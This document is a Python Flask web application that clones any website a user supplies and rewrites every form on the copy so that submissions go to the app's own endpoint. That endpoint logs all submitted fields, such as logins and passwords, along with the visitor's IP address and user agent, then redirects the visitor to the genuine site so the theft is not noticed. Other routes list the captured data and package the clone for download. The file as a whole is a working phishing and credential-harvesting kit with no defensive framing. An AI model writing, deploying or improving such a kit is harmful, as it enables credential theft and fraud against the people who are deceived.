from flask import Flask, render_template, request, send_file, jsonify
import requests
from bs4 import BeautifulSoup
import os
import shutil
from urllib.parse import urljoin, urlparse
import zipfile
import time
import re
import hashlib
import json
import threading

app = Flask(__name__)
PROJECTS = {}

def get_server_url():
    domain = os.environ.get('RAILWAY_PUBLIC_DOMAIN')
    if domain:
        return 'https://' + domain
    return 'http://localhost:' + str(os.environ.get('PORT', 5000))

@app.route('/')
def home():
    return render_template('home.html')

@app.route('/api/clone', methods=['POST'])
def api_clone():
    data = request.json
    url = data.get('url', '').strip()
    
    if not url:
        return jsonify({'error': 'URL required'}), 400
    if not url.startswith('http'):
        url = 'https://' + url
    
    pid = hashlib.md5((url + str(time.time())).encode()).hexdigest()[:12]
    out = '/tmp/' + pid
    
    os.makedirs(out, exist_ok=True)
    os.makedirs(out + '/assets', exist_ok=True)
    
    try:
        sess = requests.Session()
        sess.headers['User-Agent'] = 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15'
        
        r = sess.get(url, allow_redirects=True, timeout=20)
        if r.status_code != 200:
            return jsonify({'error': 'HTTP ' + str(r.status_code)}), 400
        
        soup = BeautifulSoup(r.text, 'html.parser')
        domain = urlparse(r.url).netloc
        assets = 0
        
        # CSS
        for tag in soup.find_all('link', href=True):
            href = tag['href']
            if not href or not href.startswith('http'):
                href = urljoin(url, href)
            try:
                name = os.path.basename(urlparse(href).path.split('?')[0]) or 'style.css'
                if '.' not in name:
                    name += '.css'
                ar = sess.get(href, timeout=10)
                if ar.status_code == 200 and len(ar.content) > 100:
                    with open(out + '/assets/' + name, 'wb') as f:
                        f.write(ar.content)
                    tag['href'] = '/p/' + pid + '/assets/' + name
                    assets += 1
            except:
                pass
        
        # JS
        for tag in soup.find_all('script', src=True):
            src = tag['src']
            if not src or not src.startswith('http'):
                src = urljoin(url, src)
            try:
                name = os.path.basename(urlparse(src).path.split('?')[0]) or 'script.js'
                if '.' not in name:
                    name += '.js'
                ar = sess.get(src, timeout=10)
                if ar.status_code == 200 and len(ar.content) > 100:
                    with open(out + '/assets/' + name, 'wb') as f:
                        f.write(ar.content)
                    tag['src'] = '/p/' + pid + '/assets/' + name
                    assets += 1
            except:
                pass
        
        # IMG
        for tag in soup.find_all('img', src=True):
            src = tag['src']
            if not src or src.startswith('data:'):
                continue
            if not src.startswith('http'):
                src = urljoin(url, src)
            try:
                ext = os.path.splitext(urlparse(src).path.split('?')[0])[1] or '.png'
                name = 'img_' + str(hash(src) % 100000) + ext
                ar = sess.get(src, timeout=10)
                if ar.status_code == 200 and len(ar.content) > 100:
                    with open(out + '/assets/' + name, 'wb') as f:
                        f.write(ar.content)
                    tag['src'] = '/p/' + pid + '/assets/' + name
                    assets += 1
            except:
                pass
        
        # Forms
        forms = 0
        for form in soup.find_all('form'):
            form['action'] = '/submit/' + pid
            form['method'] = 'POST'
            forms += 1
        
        # Сохраняем HTML
        body = soup.find('body')
        html_content = str(body) if body else str(soup)
        
        with open(out + '/index.html', 'w', encoding='utf-8') as f:
            f.write('<!DOCTYPE html>\n<html>\n<head>\n')
            f.write('<meta charset="UTF-8">\n')
            f.write('<meta name="viewport" content="width=device-width, initial-scale=1.0">\n')
            f.write('<title>' + domain + '</title>\n')
            for tag in soup.find_all('link', href=True):
                f.write(str(tag) + '\n')
            f.write('</head>\n<body>\n')
            f.write(html_content)
            f.write('\n</body>\n</html>')
        
        PROJECTS[pid] = {
            'url': url,
            'domain': domain,
            'dir': out,
            'assets': assets,
            'forms': forms,
            'logs': [],
            'time': time.ctime()
        }
        
        clone_url = get_server_url() + '/p/' + pid
        zip_url = get_server_url() + '/api/download/' + pid
        
        return jsonify({
            'id': pid,
            'url': clone_url,
            'download': zip_url,
            'assets': assets,
            'forms': forms,
            'domain': domain
        })
        
    except Exception as e:
        return jsonify({'error': str(e)[:200]}), 500

@app.route('/p/<pid>')
def serve_project(pid):
    path = '/tmp/' + pid + '/index.html'
    if os.path.exists(path):
        return open(path, 'r', encoding='utf-8').read()
    return 'Not found', 404

@app.route('/p/<pid>/assets/<name>')
def serve_asset(pid, name):
    path = '/tmp/' + pid + '/assets/' + name
    if os.path.exists(path):
        ct = 'text/css' if name.endswith('.css') else 'application/javascript' if name.endswith('.js') else 'image/png'
        return open(path, 'rb').read(), 200, {'Content-Type': ct}
    return 'Not found', 404

@app.route('/submit/<pid>', methods=['POST'])
def submit_data(pid):
    data = dict(request.form)
    data['ip'] = request.remote_addr
    data['time'] = time.strftime('%Y-%m-%d %H:%M:%S')
    data['ua'] = request.headers.get('User-Agent', '?')
    
    if pid in PROJECTS:
        PROJECTS[pid].setdefault('logs', []).append(data)
    
    log_file = '/tmp/' + pid + '/logs.json'
    with open(log_file, 'a') as f:
        f.write(json.dumps(data) + '\n')
    
    # Редирект на оригинал
    redirect_to = PROJECTS.get(pid, {}).get('url', 'https://google.com')
    return '<script>window.location.href="' + redirect_to + '";</script>'

@app.route('/api/logs/<pid>')
def api_logs(pid):
    proj = PROJECTS.get(pid, {})
    logs = proj.get('logs', [])
    return jsonify({'logs': logs, 'count': len(logs)})

@app.route('/api/download/<pid>')
def api_download(pid):
    if pid not in PROJECTS:
        return 'Not found', 404
    
    zip_path = '/tmp/' + pid + '.zip'
    shutil.make_archive('/tmp/' + pid, 'zip', PROJECTS[pid]['dir'])
    
    return send_file(zip_path, as_attachment=True, download_name='clone_' + pid + '.zip')

@app.route('/api/list')
def api_list():
    items = []
    for pid, p in PROJECTS.items():
        items.append({
            'id': pid,
            'url': p['url'],
            'domain': p['domain'],
            'logs': len(p.get('logs', [])),
            'time': p['time']
        })
    return jsonify({'projects': items})

if __name__ == '__main__':
    os.makedirs('/tmp', exist_ok=True)
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
